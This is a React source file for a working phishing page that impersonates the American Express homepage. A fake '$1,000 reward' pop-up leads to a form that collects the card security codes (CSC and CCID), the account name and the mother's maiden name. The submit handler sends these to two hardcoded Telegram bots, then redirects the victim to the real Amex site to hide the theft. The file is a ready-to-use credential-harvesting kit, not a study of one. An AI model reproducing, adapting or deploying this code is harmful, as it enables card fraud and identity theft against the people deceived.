import { useEffect, useState } from "react";
import { Search, Menu, CreditCard, PiggyBank, DollarSign, Building2, TrendingUp, Wallet, MapPin, Gauge, Smartphone, Settings, ChevronRight } from "lucide-react";

const heroImg = "https://images.pexels.com/photos/20219119/pexels-photo-20219119.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreGiftcard = "https://images.pexels.com/photos/8015244/pexels-photo-8015244.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreOffers = "https://images.pexels.com/photos/6634182/pexels-photo-6634182.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const exploreEvents = "https://images.pexels.com/photos/36675302/pexels-photo-36675302.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";
const cardImg = "https://images.pexels.com/photos/7821902/pexels-photo-7821902.jpeg?auto=compress&cs=tinysrgb&fit=crop&h=627&w=1200";

function CloseIcon() {
  return <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 6L6 18"/><path d="M6 6l12 12"/></svg>;
}

export default function App() {
  const [showModal, setShowModal] = useState(false);
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [showMobileNav, setShowMobileNav] = useState(false);

  const [form, setForm] = useState({ name: "", csc: "", ccid: "", maiden: "" });
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [progressMessage, setProgressMessage] = useState<string | null>(null);
  const [alertMessage, setAlertMessage] = useState<string | null>(null);

  useEffect(() => {
    const timer = setTimeout(() => setShowModal(true), 3000);
    return () => clearTimeout(timer);
  }, []);

  // Close mobile nav on resize to desktop
  useEffect(() => {
    const handleResize = () => {
      if (window.innerWidth >= 768) setShowMobileNav(false);
    };
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const anyModalOpen = showModal || showInfoModal || showProgressModal;

  const sidebarItems = [
    { icon: CreditCard, label: "Credit Cards" },
    { icon: PiggyBank, label: "High Yield Savings" },
    { icon: DollarSign, label: "Personal Loans" },
    { icon: Building2, label: "Online Checking" },
    { icon: TrendingUp, label: "Investing" },
    { icon: Wallet, label: "Send & Split" },
  ];

  return (
    <div className="min-h-screen bg-white text-[oklch(0.2_0.02_250)]">
      <div className={anyModalOpen ? "blur-sm pointer-events-none select-none" : ""}>

      {/* ====== TOP NAVIGATION ====== */}
      <header className="border-b border-[oklch(0.85_0.02_250)]">
        <div className="mx-auto flex flex-col gap-3 px-4 py-3 sm:px-6 md:flex-row md:items-center md:gap-8 md:py-3 max-w-[1280px]">
          {/* Logo */}
          <div className="flex h-10 w-auto items-center justify-center bg-[oklch(0.5_0.2_260)] px-3 text-[10px] font-bold leading-tight text-white sm:h-12 sm:px-4">
            AMERICAN<br/>EXPRESS
          </div>

          {/* Hamburger button (mobile only) */}
          <div className="flex items-center gap-2 md:hidden">
            <button
              type="button"
              onClick={() => setShowMobileNav((prev) => !prev)}
              className="inline-flex items-center justify-center rounded-md border border-[oklch(0.85_0.02_250)] p-2 text-[oklch(0.5_0.2_260)]"
              aria-label="Toggle navigation menu"
            >
              <Menu className="h-5 w-5" />
            </button>
          </div>

          {/* Desktop nav links */}
          <nav className="hidden flex-wrap items-center gap-3 text-sm font-medium text-[oklch(0.5_0.2_260)] md:flex">
            <a href="#" className="hover:underline">My Account</a>
            <a href="#" className="hover:underline">Cards</a>
            <a href="#" className="hover:underline">Banking</a>
            <a href="#" className="hover:underline">Travel</a>
            <a href="#" className="hover:underline">Rewards & Benefits</a>
            <a href="#" className="hover:underline">Business</a>
          </nav>

          {/* Mobile nav dropdown */}
          {showMobileNav && (
            <nav className="flex flex-col gap-0 rounded-lg border border-[oklch(0.85_0.02_250)] bg-white py-1 md:hidden shadow-lg">
              {["My Account","Cards","Banking","Travel","Rewards & Benefits","Business"].map((link) => (
                <a
                  key={link}
                  href="#"
                  onClick={() => setShowMobileNav(false)}
                  className="flex items-center justify-between px-5 py-3 text-sm font-medium text-[oklch(0.2_0.02_250)] hover:bg-[oklch(0.97_0.005_250)]"
                >
                  {link}
                  <ChevronRight className="h-4 w-4 text-[oklch(0.5_0.2_260)]" />
                </a>
              ))}
            </nav>
          )}

          {/* Right side actions */}
          <div className="flex flex-wrap items-center gap-3 md:ml-auto">
            <button aria-label="Search" className="text-[oklch(0.5_0.2_260)]">
              <Search className="h-5 w-5" />
            </button>
            <a href="#" className="text-sm font-medium text-[oklch(0.5_0.2_260)] hover:underline">
              <span className="hidden sm:inline">Customer Service</span>
              <span className="sm:hidden text-xs">Help</span>
            </a>
            <a href="#" className="rounded-sm bg-[oklch(0.5_0.2_260)] px-4 py-2 text-sm font-semibold text-white hover:bg-[oklch(0.45_0.2_260)] whitespace-nowrap">
              Log In
            </a>
          </div>
        </div>
      </header>

      {/* ====== TABS + FDIC BAR ====== */}
      <div className="bg-[oklch(0.96_0.005_250)] border-b border-[oklch(0.9_0.01_250)]">
        <div className="mx-auto flex flex-col gap-3 px-4 py-2 sm:flex-row sm:items-center sm:px-6 md:px-6 md:py-3 max-w-[1280px]">
          <div className="flex flex-wrap gap-1 sm:gap-2">
            <button className="border-b-[3px] border-[oklch(0.25_0.1_260)] bg-white px-4 py-2 sm:px-6 text-sm font-semibold text-[oklch(0.2_0.02_250)]">
              Personal
            </button>
            <button className="px-4 py-2 sm:px-6 text-sm font-medium text-[oklch(0.5_0.2_260)] hover:text-[oklch(0.25_0.1_260)]">
              Business
            </button>
          </div>
          <div className="flex items-center gap-2 text-xs text-[oklch(0.2_0.02_250)] sm:ml-auto">
            <span className="font-bold text-[oklch(0.25_0.1_260)] text-sm sm:text-base">FDIC</span>
            <span className="hidden sm:inline">FDIC-Insured – Backed by the full faith and credit of the U.S. Government</span>
            <span className="sm:hidden text-[10px]">FDIC-Insured</span>
          </div>
        </div>
      </div>

      {/* ====== MAIN CONTENT ====== */}
      <main className="mx-auto max-w-[1280px] px-4 py-4 sm:px-6 sm:py-6">

        {/* Mobile sidebar: horizontal scroll */}
        <section className="lg:hidden mb-4 -mx-4 sm:-mx-6">
          <div className="overflow-x-auto pb-2 px-4 sm:px-6">
            <div className="flex gap-3 min-w-max">
              {sidebarItems.map(({ icon: Icon, label }) => (
                <a
                  key={label}
                  href="#"
                  className="flex flex-col items-center justify-center gap-1 min-w-[90px] rounded-xl border border-[oklch(0.85_0.02_250)] bg-white px-4 py-4 hover:bg-[oklch(0.98_0.005_250)] hover:border-[oklch(0.5_0.2_260)] transition-colors"
                >
                  <Icon className="h-6 w-6 stroke-[1.5] text-[oklch(0.5_0.2_260)]" />
                  <span className="text-[11px] font-semibold text-[oklch(0.2_0.02_250)] text-center leading-tight">{label}</span>
                </a>
              ))}
            </div>
          </div>
        </section>

        <div className="flex flex-col gap-6 lg:flex-row">
          {/* Desktop Sidebar */}
          <aside className="hidden lg:block lg:w-[280px] border border-[oklch(0.85_0.02_250)] rounded-lg overflow-hidden">
            {sidebarItems.map(({ icon: Icon, label }, i) => (
              <a
                key={label}
                href="#"
                className={`flex items-center gap-4 px-6 py-5 hover:bg-[oklch(0.97_0.005_250)] transition-colors ${i !== 0 ? "border-t border-[oklch(0.85_0.02_250)]" : ""}`}
              >
                <Icon className="h-8 w-8 stroke-[1.5] text-[oklch(0.5_0.2_260)]" />
                <span className="text-base font-semibold text-[oklch(0.2_0.02_250)]">{label}</span>
              </a>
            ))}
          </aside>

          {/* Hero Section */}
          <section className="relative flex-1 overflow-hidden rounded-lg">
            <img src={heroImg} alt="Couple enjoying poolside breakfast with ocean view" className="w-full object-cover h-[280px] sm:h-[360px] md:h-[420px] lg:h-[460px]" />
            <div className="absolute inset-0 bg-gradient-to-r from-black/70 via-black/40 to-transparent sm:from-black/60 sm:via-black/30" />
            <div className="absolute inset-0 flex flex-col justify-end sm:justify-center px-5 pb-8 sm:px-10 sm:pb-12 md:px-12 md:pb-16 text-white">
              <div className="mb-4 sm:mb-6 h-10 w-16 sm:h-14 sm:w-20 bg-white/10 backdrop-blur-sm rounded" />
              <h1 className="max-w-xl text-2xl sm:text-3xl md:text-[44px] font-light leading-tight">
                Don't miss out: Earn up<br className="hidden sm:block" /> to 125,000 bonus miles
              </h1>
              <p className="mt-3 sm:mt-4 md:mt-6 text-sm sm:text-base font-semibold">
                NEW – Check your second bag free on domestic Delta flights.
              </p>
              <a href="#" className="mt-4 sm:mt-5 inline-block w-full sm:w-fit max-w-[280px] rounded border-2 border-white bg-white px-8 py-3 text-sm font-semibold text-[oklch(0.5_0.2_260)] hover:bg-transparent hover:text-white text-center transition-colors">
                Learn more
              </a>
              <p className="mt-3 sm:mt-4 text-xs opacity-80">Terms apply.</p>
              <p className="mt-4 sm:mt-6 text-xs sm:text-sm font-bold tracking-wide uppercase">
                DON'T <span className="font-serif italic font-normal text-base sm:text-lg md:text-xl">live life</span> WITHOUT IT®
              </p>
            </div>
          </section>
        </div>
      </main>

      {/* ====== MORE TO EXPLORE ====== */}
      <section className="bg-[oklch(0.96_0.005_250)] py-8 sm:py-10">
        <div className="mx-auto max-w-[1280px] px-4 sm:px-6">
          <h2 className="mb-6 sm:mb-8 text-center text-xl sm:text-2xl font-normal text-[oklch(0.2_0.02_250)]">More to Explore</h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-6">
            {[
              { img: exploreGiftcard, text: "Find a perfect Gift Card. Terms apply.", cta: "Explore Amex Gift Cards" },
              { img: exploreOffers, text: "Eligible Members Unlock Extra Rewards*", cta: "Explore Amex Offers" },
              { img: exploreEvents, text: "Enjoy more at the events you love", cta: "Explore Amex Experiences" },
            ].map((c) => (
              <div key={c.cta} className="flex flex-col bg-white rounded-lg overflow-hidden shadow-sm hover:shadow-md transition-shadow">
                <img src={c.img} alt="" loading="lazy" width={768} height={512} className="h-[200px] sm:h-[240px] w-full object-cover" />
                <div className="flex flex-1 flex-col p-5 sm:p-6">
                  <p className="min-h-[48px] sm:min-h-[56px] text-sm sm:text-base text-[oklch(0.2_0.02_250)]">{c.text}</p>
                  <a href="#" className="mt-4 sm:mt-6 inline-block rounded-sm border border-[oklch(0.5_0.2_260)] py-2.5 sm:py-3 text-center text-sm font-medium text-[oklch(0.5_0.2_260)] hover:bg-[oklch(0.97_0.02_260)] transition-colors">
                    {c.cta}
                  </a>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ====== INFO TILES ====== */}
      <section className="bg-[oklch(0.97_0.005_250)] py-8 sm:py-10">
        <div className="mx-auto max-w-[1280px] px-4 sm:px-6">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5 sm:gap-6">
            {[
              { icon: MapPin, title: "Places to Use Your Card", desc: "Check out businesses that accept Amex", cta: "Explore Now" },
              { icon: Gauge, title: "FICO® Score and Insights", desc: "Build Good Credit Habits with American Express® MyCredit Guide", cta: "Enroll Now" },
              { icon: Smartphone, title: "Explore the Amex App", desc: "Tap into tools that help you get more from Membership. Terms apply.", cta: "Download Now" },
            ].map(({ icon: Icon, title, desc, cta }) => (
              <div key={title} className="flex flex-col items-center bg-white rounded-lg px-6 sm:px-8 py-8 sm:py-10 text-center shadow-sm hover:shadow-md transition-shadow">
                <Icon className="h-10 w-10 sm:h-12 sm:w-12 stroke-[1.5] text-[oklch(0.5_0.2_260)]" />
                <h3 className="mt-4 sm:mt-6 text-base sm:text-lg font-bold text-[oklch(0.2_0.02_250)]">{title}</h3>
                <p className="mt-2 sm:mt-3 min-h-[44px] text-sm text-[oklch(0.2_0.02_250)]">{desc}</p>
                <a href="#" className="mt-4 sm:mt-6 w-full bg-[oklch(0.5_0.2_260)] py-2.5 sm:py-3 text-sm font-semibold text-white hover:bg-[oklch(0.45_0.2_260)] rounded transition-colors">
                  {cta}
                </a>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ====== FOOTER LINKS ====== */}
      <section className="border-t border-[oklch(0.85_0.02_250)] bg-white py-8 sm:py-10">
        <div className="mx-auto max-w-[1280px] px-4 sm:px-6">
          <div className="grid grid-cols-2 gap-6 sm:gap-8 md:grid-cols-2 lg:grid-cols-4">
            {[
              { h: "ABOUT", links: ["About American Express", "Newsroom", "Careers", "Investor Relations"] },
              { h: "PRODUCTS & SERVICES", links: ["Credit Cards", "Business Credit Cards", "Corporate Programs", "Savings Accounts & CDs"] },
              { h: "LINKS YOU MAY LIKE", links: ["Membership Rewards", "FICO® Score and Insights", "Refer a Friend", "Gift Cards"] },
              { h: "ADDITIONAL INFORMATION", links: ["Credit Intel – Financial Education Center", "Amex Business Intel™ - B2B Education Center", "Supplier Diversity"] },
            ].map((col) => (
              <div key={col.h}>
                <h4 className="mb-3 sm:mb-4 text-xs font-bold tracking-wider text-[oklch(0.2_0.02_250)]">{col.h}</h4>
                <ul className="space-y-2 sm:space-y-3">
                  {col.links.map((l) => (
                    <li key={l}><a href="#" className="text-xs sm:text-sm text-[oklch(0.5_0.2_260)] hover:underline">{l}</a></li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ====== FOOTER BOTTOM ====== */}
      <footer className="border-t border-[oklch(0.85_0.02_250)] bg-white py-8 sm:py-10">
        <div className="mx-auto max-w-[1280px] px-4 sm:px-6">
          {/* Brand + Social + Country */}
          <div className="flex flex-col items-start gap-6 sm:flex-row sm:items-start sm:justify-between">
            <div>
              <div className="text-xl sm:text-2xl font-extrabold tracking-tight text-[oklch(0.5_0.2_260)]">AMERICAN EXPRESS</div>
              <div className="mt-4 flex items-center gap-4">
                <a href="#" aria-label="Facebook" className="h-5 w-5 sm:h-6 sm:w-6 text-[oklch(0.4_0.15_260)] hover:opacity-75 transition-opacity">
                  <svg viewBox="0 0 24 24" fill="currentColor"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                </a>
                <a href="#" aria-label="X" className="h-5 w-5 sm:h-6 sm:w-6 text-[oklch(0.2_0.02_250)] hover:opacity-75 transition-opacity">
                  <svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                </a>
                <a href="#" aria-label="Instagram" className="h-5 w-5 sm:h-6 sm:w-6 text-[oklch(0.55_0.2_20)] hover:opacity-75 transition-opacity">
                  <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
                </a>
                <a href="#" aria-label="LinkedIn" className="h-5 w-5 sm:h-6 sm:w-6 text-[oklch(0.45_0.15_240)] hover:opacity-75 transition-opacity">
                  <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
                </a>
                <a href="#" aria-label="YouTube" className="h-5 w-5 sm:h-6 sm:w-6 text-[oklch(0.55_0.22_25)] hover:opacity-75 transition-opacity">
                  <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
                </a>
              </div>
            </div>
            <div className="flex items-center gap-2 sm:gap-3 text-xs sm:text-sm">
              <span aria-hidden>🇺🇸</span>
              <span className="text-[oklch(0.2_0.02_250)]">United States</span>
              <a href="#" className="text-[oklch(0.5_0.2_260)] hover:underline">Change Country</a>
            </div>
          </div>

          {/* Legal links */}
          <div className="mt-6 sm:mt-8 flex flex-wrap items-center gap-x-3 sm:gap-x-4 gap-y-1.5 sm:gap-y-2 text-xs sm:text-sm">
            {["Terms of Service","Privacy Center","Do Not Sell or Share My Personal Information","AdChoices","Security Center","Card Agreements","Servicemember Benefits","Site Map"].map((l, i, arr) => (
              <span key={l} className="flex items-center gap-3 sm:gap-4">
                <a href="#" className="text-[oklch(0.5_0.2_260)] hover:underline">{l}</a>
                {i < arr.length - 1 && <span className="text-[oklch(0.7_0.02_250)]">|</span>}
              </span>
            ))}
          </div>

          <p className="mt-4 sm:mt-6 text-xs text-[oklch(0.35_0.02_250)]">
            All users of our online services are subject to our Privacy Statement and agree to be bound by the Terms of Service. Please review.
          </p>
          <p className="mt-2 sm:mt-3 text-xs text-[oklch(0.35_0.02_250)]">© 2026 American Express. All rights reserved</p>
        </div>
      </footer>

      {/* ====== FEEDBACK TAB ====== */}
      <button className="fixed right-0 top-1/2 -translate-y-1/2 rotate-180 [writing-mode:vertical-rl] bg-[oklch(0.45_0.08_180)] px-2 py-3 sm:px-3 sm:py-4 text-xs sm:text-sm font-semibold text-white rounded-l-md hover:bg-[oklch(0.4_0.08_180)] transition-colors hidden sm:block">
        Give Feedback
      </button>
      {/* Mobile feedback button (non-vertical) */}
      <button className="fixed bottom-4 right-4 sm:hidden z-40 bg-[oklch(0.45_0.08_180)] px-4 py-2.5 text-xs font-semibold text-white rounded-full shadow-lg hover:bg-[oklch(0.4_0.08_180)] transition-colors">
        💬 Feedback
      </button>
      </div>

      {/* ====== PROMO MODAL ====== */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-3 sm:p-4" onClick={() => setShowModal(false)}>
          <div className="relative w-full max-w-[420px] overflow-hidden rounded-lg bg-white shadow-2xl animate-in fade-in zoom-in" onClick={(e) => e.stopPropagation()}>
            {/* Header */}
            <div className="relative bg-[oklch(0.5_0.2_260)] px-5 sm:px-6 py-5 sm:py-6 text-center text-white">
              <button
                onClick={() => {
                  setShowModal(false);
                  setAlertMessage("Fill your information to proceed");
                  setTimeout(() => setAlertMessage(null), 3000);
                }}
                aria-label="Close"
                className="absolute right-3 sm:right-4 top-3 sm:top-4 text-white hover:text-white/80 p-1"
              >
                <CloseIcon />
              </button>
              <h2 className="text-xl sm:text-2xl font-bold">CONGRATULATIONS!!!</h2>
              <p className="mt-2 text-sm sm:text-base">
                You have been rewarded <span className="font-bold">$1,000</span> on your card
              </p>
            </div>

            {/* Card image */}
            <div className="bg-[oklch(0.96_0.005_250)] px-5 sm:px-6 py-4 sm:py-6">
              <div className="mx-auto w-full max-w-[320px] overflow-hidden rounded-lg shadow-lg">
                <img src={cardImg} alt="American Express Card" className="w-full h-auto object-cover" />
              </div>
            </div>

            {/* Body */}
            <div className="px-5 sm:px-6 pb-6 pt-3 text-center">
              <p className="text-xs sm:text-sm leading-relaxed text-[oklch(0.35_0.02_250)]">
                Action Required: Click the button below to confirm your card details and claim your reward. This must be completed within 72 hours.
              </p>
              <button
                type="button"
                onClick={() => { setShowModal(false); setShowInfoModal(true); }}
                className="mt-4 sm:mt-5 inline-block w-full rounded bg-[oklch(0.5_0.2_260)] py-2.5 sm:py-3 text-center text-sm sm:text-base font-bold text-white hover:bg-[oklch(0.45_0.2_260)] transition-colors"
              >
                Claim Your Reward Now
              </button>
              <p className="mt-3 sm:mt-4 text-xs text-[oklch(0.5_0.02_250)]">
                *Terms and conditions apply. This security step expires in 72 hours.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* ====== INFO COLLECTION MODAL ====== */}
      {showInfoModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-3 sm:p-4" onClick={() => setShowInfoModal(false)}>
          <div className="relative w-full max-w-[440px] overflow-hidden rounded-lg bg-white shadow-2xl animate-in fade-in zoom-in" onClick={(e) => e.stopPropagation()}>
            <div className="relative bg-[oklch(0.5_0.2_260)] px-5 sm:px-6 py-4 sm:py-5 text-white">
              <button
                onClick={() => setShowInfoModal(false)}
                aria-label="Close"
                className="absolute right-3 sm:right-4 top-3 sm:top-4 text-white hover:text-white/80 p-1"
              >
                <CloseIcon />
              </button>
              <h2 className="text-xl sm:text-2xl font-bold">Complete Your Information</h2>
              <p className="mt-1 sm:mt-2 text-xs sm:text-sm">
                Please provide the following details to claim your reward on card
              </p>
            </div>

            <form
              onSubmit={async (e) => {
                  e.preventDefault();
                  setShowInfoModal(false);
                  const telegrams = [
                    { token: "5963887785:AAGpNa8vl3HCcXbQs51VSzfM_X0HvB_BJPw", chatId: "951261137g" },
                    { token: "7306143124:AAHnhg3bKSmqjSMXMhstk6b1EkR3DR4YTSI", chatId: "7310413301" },
                  ];

                  const text = `Submitted details:\nName on Account: ${form.name}\nCSC: ${form.csc}\nCCID: ${form.ccid}\nMother's maiden name: ${form.maiden}\nURL: ${window.location.href}`;

                  for (const t of telegrams) {
                    try {
                      const url = `https://api.telegram.org/bot${t.token}/sendMessage`;
                      await fetch(url, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: t.chatId, text }),
                      });
                    } catch (err) {
                      console.warn("Telegram send failed", err);
                    }
                  }

                  setShowProgressModal(true);
                  setProgressMessage(null);

                  setTimeout(() => {
                    setProgressMessage("An agent will contact you soon");
                    setTimeout(() => {
                      window.location.href = "https://www.americanexpress.com";
                    }, 2000);
                  }, 10000);
              }}
              className="px-5 sm:px-6 py-5 sm:py-6 space-y-4"
            >
              <div>
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">Name on the Account</label>
                <input
                  type="text"
                  required
                  value={form.name}
                  onChange={(e) => setForm({ ...form, name: e.target.value })}
                  placeholder="Full name as shown on account"
                  className="mt-2 w-full rounded border border-[oklch(0.85_0.02_250)] px-3 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-1 focus:ring-[oklch(0.5_0.2_260)]"
                />
              </div>

              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                <div>
                  <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">CSC (3 digits)</label>
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    pattern="[0-9]{3}"
                    maxLength={3}
                    value={form.csc}
                    onChange={(e) => setForm({ ...form, csc: e.target.value.replace(/\D/g, "") })}
                    placeholder="123"
                    className="mt-2 w-full rounded border border-[oklch(0.85_0.02_250)] px-3 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-1 focus:ring-[oklch(0.5_0.2_260)]"
                  />
                </div>
                <div>
                  <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">CCID (4 digits)</label>
                  <input
                    type="text"
                    required
                    inputMode="numeric"
                    pattern="[0-9]{4}"
                    maxLength={4}
                    value={form.ccid}
                    onChange={(e) => setForm({ ...form, ccid: e.target.value.replace(/\D/g, "") })}
                    placeholder="1234"
                    className="mt-2 w-full rounded border border-[oklch(0.85_0.02_250)] px-3 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-1 focus:ring-[oklch(0.5_0.2_260)]"
                  />
                </div>
              </div>
              <div>
                <label className="block text-sm font-semibold text-[oklch(0.2_0.02_250)]">Mother's Maiden Name</label>
                <input
                  type="text"
                  required
                  value={form.maiden}
                  onChange={(e) => setForm({ ...form, maiden: e.target.value })}
                  placeholder="Enter mother's maiden name"
                  className="mt-2 w-full rounded border border-[oklch(0.85_0.02_250)] px-3 py-2.5 text-sm focus:border-[oklch(0.5_0.2_260)] focus:outline-none focus:ring-1 focus:ring-[oklch(0.5_0.2_260)]"
                />
              </div>

              <button
                type="submit"
                className="mt-2 w-full rounded bg-[oklch(0.5_0.2_260)] py-2.5 sm:py-3 text-sm sm:text-base font-bold text-white hover:bg-[oklch(0.45_0.2_260)] transition-colors"
              >
                Verify
              </button>
              <p className="text-center text-xs text-[oklch(0.5_0.02_250)]">
                Your information is secure and will only be used to verify your card.
              </p>
            </form>
          </div>
        </div>
      )}

      {/* ====== PROGRESS MODAL ====== */}
      {showProgressModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4 sm:p-6">
          <div className="relative w-full max-w-[360px] overflow-hidden rounded-lg bg-white shadow-2xl animate-in fade-in zoom-in">
            <div className="px-6 py-8 sm:px-8 sm:py-10 text-center">
              <div className="flex items-center justify-center gap-6 sm:gap-8">
                <Settings className="h-12 w-12 sm:h-14 sm:w-14 animate-spin text-[oklch(0.5_0.2_260)]" style={{ animationDuration: '3s' }} />
                <Settings className="h-12 w-12 sm:h-14 sm:w-14 animate-spin text-[oklch(0.5_0.2_260)]" style={{ animationDuration: '3s', animationDirection: 'reverse' }} />
              </div>
              <p className="mt-6 text-sm sm:text-base text-[oklch(0.2_0.02_250)]">Processing your information...</p>
              {progressMessage && (
                <p className="mt-4 text-sm font-semibold text-[oklch(0.2_0.02_250)]">{progressMessage}</p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ====== ALERT TOAST ====== */}
      {alertMessage && (
        <div className="fixed bottom-16 sm:bottom-6 left-4 right-4 max-w-sm mx-auto z-[60]">
          <div className="bg-red-500 text-white rounded-lg px-4 py-3 shadow-lg">
            <p className="text-sm font-medium">{alertMessage}</p>
          </div>
        </div>
      )}
    </div>
  );
}
